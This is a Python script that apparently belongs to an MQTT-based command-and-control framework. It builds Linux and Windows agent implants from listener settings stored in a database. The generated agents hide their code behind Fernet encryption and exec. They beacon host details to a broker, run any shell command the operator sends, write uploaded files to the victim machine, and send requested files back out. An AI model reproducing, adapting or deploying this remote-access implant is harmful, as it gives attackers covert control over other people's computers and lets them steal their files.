#generate some agents

import os
import sqlite3
from collections import namedtuple
import pandas as pd

def agentlist():
	dbfile = (os.path.dirname(os.path.realpath(__file__))+"/mqt-config.db")
	conn = sqlite3.connect(dbfile)
	conn.isolation_level = None
	cursor = conn.cursor()
	df = pd.read_sql_query("SELECT Active FROM listener WHERE Active = 'yes'", conn)
	print("\n")
	if df.empty == True:
		print("No active listeners have been selected, please add or select a listener.\n")
		print("\n")
		return
	conn.close
	AF = namedtuple('AF', 'ID Transport Address Port User Pass Key')
	conn = sqlite3.connect(dbfile)
	conn.isolation_level = None
	conn.row_factory = lambda cursor, row: AF(*row)
	cursor = conn.cursor()
	for row in cursor.execute("SELECT ID, Transport, Address, Port, User, Pass, Key from listener WHERE Active = 'yes'"):
		bid=str(row.ID)
		btrans=str(row.Transport)
		bbroker=str(row.Address)
		bport=int(row.Port)
		busername=str(row.User)
		bpassword=str(row.Pass)
		key=bytes(row.Key)
	conn.close()
	linagent = (os.path.dirname(os.path.realpath(__file__))+"/agents/"+str(bid)+"_"+btrans+"_lin.py")
	winagent = (os.path.dirname(os.path.realpath(__file__))+"/agents/"+str(bid)+"_"+btrans+"_win.py")
	codestart = '''
from cryptography.fernet import Fernet
whatevs=b"""
_E='beacon/checkin/'
_D='target/'
_C='UTF-8'
_B='/'
_F='ul/'
_G='ulf/'
_H='dln/'
_I='dl/'
_A=','
import paho.mqtt.client as mqtt,subprocess,os,platform,base64
clientname=platform.node()
oss=platform.system()'''
	
	flinagent = open(linagent, "w")
	flinagent.write(codestart)
	flinagent.close
	flinagent2 = open(linagent, "a")
	flinagent2.write("\nbroker = '"+bbroker+"'\n"+"port = "+str(bport)+"\n"+"atrans = '"+btrans+"'\n"+"username = '"+busername+"'\n"+"password = '"+bpassword+"'\n"+"key2 = '"+str(key, 'utf-8')+"'\n")	

	lincodeend = '''
hosti=subprocess.Popen(['wget','-q','-O','-','http://ifconfig.me'],stdout=subprocess.PIPE).communicate()[0]
hostip=hosti.decode(_C).strip()
yomama=atrans+_A+hostip+_A+clientname+_A+username+_A+oss+_A+broker+_A+str(port)
yomama2 = bytes(yomama, 'utf-8')
cipher = Fernet(key2)
encrypted_message2 = cipher.encrypt(yomama2)
yomama3 = encrypted_message2.decode()
topic_cmd=_D+clientname+_B
topic_out='output/'+clientname+_B
topic_err='error/'+clientname+_B
topic_cwd='cwd/'+clientname+_B
topic_chk=_E
topic_bea='beacon/clients/'
topic_ul=_D+clientname+_B+_F
topic_ulf=_D+clientname+_B+_G
topic_dln=_D+clientname+_B+_H
topic_dl=_D+clientname+_B+_I
def on_connect(client,userdata,flags,rc):client.subscribe(topic_cmd);client.subscribe(topic_chk);client.subscribe(topic_ul);client.subscribe(topic_ulf);client.subscribe(topic_dln);client.publish(topic_bea,payload=yomama3)
def on_checkin(client,userdata,msg):client.publish(topic_bea,payload=yomama3)
def on_command(client,userdata,msg):
	decrypted_message2 = cipher.decrypt(msg.payload)
	wCommand = str(decrypted_message2.decode('UTF-8'))
	try:process=subprocess.Popen(wCommand.split(),stdout=subprocess.PIPE);output,error=process.communicate();payload1=bytes(output);encrypted_message99 = cipher.encrypt(payload1);payload2 = encrypted_message99.decode();client.publish(topic_out,payload=payload2);tcwd=bytes(os.getcwd()+"/", 'utf-8');encrypted_message98 = cipher.encrypt(tcwd);tcwd2 = encrypted_message98.decode();client.publish(topic_cwd,payload=tcwd2)
	except:client.connect(broker,port,60);payload5=b'Error Occured';encrypted_message4 = cipher.encrypt(payload5);payload7 = encrypted_message4.decode();client.publish(topic_err,payload=payload7)
def on_ul(client,userdata,msg):
	decrypted_message5 = cipher.decrypt(msg.payload)
	global ulfn;ulfn = str(decrypted_message5.decode('UTF-8'))
def on_ulf(client,userdata,msg): #added
	decrypted_message6 = cipher.decrypt(msg.payload)
	save_upload(decrypted_message6, ulfn)
def save_upload(payload, filename): #added
	f=open(filename, "wb")
	f.write(payload)
	f.close()
def on_dln(client,userdata,msg): #added
	decrypted_message7 = cipher.decrypt(msg.payload)
	dlfn = str(decrypted_message7.decode('UTF-8'))
	dlfile = open(dlfn, mode='rb')
	fileContent = dlfile.read()
	fc=cipher.encrypt(fileContent)
	fc2=fc.decode()
	client.publish(topic_dl,payload=fc2)
client=mqtt.Client(clientname,False,transport=atrans)
client.tls_set()
client.message_callback_add(_D+clientname+_B,on_command)
client.message_callback_add(_E,on_checkin)
client.message_callback_add(_D+clientname+_B+_F,on_ul)
client.message_callback_add(_D+clientname+_B+_G,on_ulf)
client.message_callback_add(_D+clientname+_B+_H,on_dln)
client.on_connect=on_connect
client.username_pw_set(username,password)
client.connect(broker,port,60)
client.loop_forever()"""
key=Fernet.generate_key()
encryption_type=Fernet(key)
encrypted_message=encryption_type.encrypt(whatevs)
decrypted_message=encryption_type.decrypt(encrypted_message)
exec(decrypted_message)'''
	wincodeend = '''
hosti=subprocess.Popen(['curl', '--silent', 'http://ifconfig.me'],stdout=subprocess.PIPE).stdout.read()
hostip=hosti.decode(_C).strip()
yomama=atrans+_A+hostip+_A+clientname+_A+username+_A+oss+_A+broker+_A+str(port)
yomama2 = bytes(yomama, 'utf-8')
cipher = Fernet(key2)
encrypted_message2 = cipher.encrypt(yomama2)
yomama3 = encrypted_message2.decode()
topic_cmd=_D+clientname+_B
topic_out='output/'+clientname+_B
topic_err='error/'+clientname+_B
topic_cwd='cwd/'+clientname+_B
topic_ul=_D+clientname+_B+_F
topic_ulf=_D+clientname+_B+_G
topic_dln=_D+clientname+_B+_H
topic_dl=_D+clientname+_B+_I
topic_chk=_E
topic_bea='beacon/clients/'
def on_connect(client,userdata,flags,rc):client.subscribe(topic_cmd);client.subscribe(topic_chk);client.subscribe(topic_ul);client.subscribe(topic_ulf);client.subscribe(topic_dln);client.publish(topic_bea,payload=yomama3)
def on_checkin(client,userdata,msg):client.publish(topic_bea,payload=yomama3)
def on_command(client,userdata,msg):
	decrypted_message2 = cipher.decrypt(msg.payload)
	wCommand = str(decrypted_message2.decode('UTF-8'))
	try:process=subprocess.Popen(wCommand.split(),stdout=subprocess.PIPE,shell=True);output,error=process.communicate();payload1=bytes(output);encrypted_message99 = cipher.encrypt(payload1);payload2 = encrypted_message99.decode();client.publish(topic_out,payload=payload2);tcwd=bytes(os.getcwd()+"/", 'utf-8');encrypted_message98 = cipher.encrypt(tcwd);tcwd2 = encrypted_message98.decode();client.publish(topic_cwd,payload=tcwd2)
	except:client.connect(broker,port,60);payload5=b'Error Occured';encrypted_message4 = cipher.encrypt(payload5);payload7 = encrypted_message4.decode();client.publish(topic_err,payload=payload7)
def on_ul(client,userdata,msg):
	decrypted_message5 = cipher.decrypt(msg.payload)
	global ulfn;ulfn = str(decrypted_message5.decode('UTF-8'))
def on_ulf(client,userdata,msg): #added
	decrypted_message6 = cipher.decrypt(msg.payload)
	save_upload(decrypted_message6, ulfn)
def save_upload(payload, filename): #added
	f=open(filename, "wb")
	f.write(payload)
	f.close()
def on_dln(client,userdata,msg): #added
	decrypted_message7 = cipher.decrypt(msg.payload)
	dlfn = str(decrypted_message7.decode('UTF-8'))
	dlfile = open(dlfn, mode='rb')
	fileContent = dlfile.read()
	fc=cipher.encrypt(fileContent)
	fc2=fc.decode()
	client.publish(topic_dl,payload=fc2)
client=mqtt.Client(clientname,False,transport=atrans)
client.tls_set()
client.message_callback_add(_D+clientname+_B,on_command)
client.message_callback_add(_E,on_checkin)
client.message_callback_add(_D+clientname+_B+_F,on_ul)
client.message_callback_add(_D+clientname+_B+_G,on_ulf)
client.message_callback_add(_D+clientname+_B+_H,on_dln)
client.on_connect=on_connect
client.username_pw_set(username,password)
client.connect(broker,port,60)
client.loop_forever()"""
key=Fernet.generate_key()
encryption_type=Fernet(key)
encrypted_message=encryption_type.encrypt(whatevs)
decrypted_message=encryption_type.decrypt(encrypted_message)
exec(decrypted_message)'''
	flinagent2.write(lincodeend)
	flinagent2.close
	#windows agent
	fwinagent = open(winagent, "w")
	fwinagent.write(codestart)
	fwinagent.close
	fwinagent2 = open(winagent, "a")
	fwinagent2.write("\nbroker = '"+bbroker+"'\n"+"port = "+str(bport)+"\n"+"atrans = '"+btrans+"'\n"+"username = '"+busername+"'\n"+"password = '"+bpassword+"'\n"+"key2 = '"+str(key, 'utf-8')+"'\n")	
	fwinagent2.write(wincodeend)
	fwinagent2.close
	print("\nLinux python agent for listener "+bid+" located at "+linagent+"\n")
	print("\nWindows python agent for listener "+bid+" located at "+winagent+"\n")

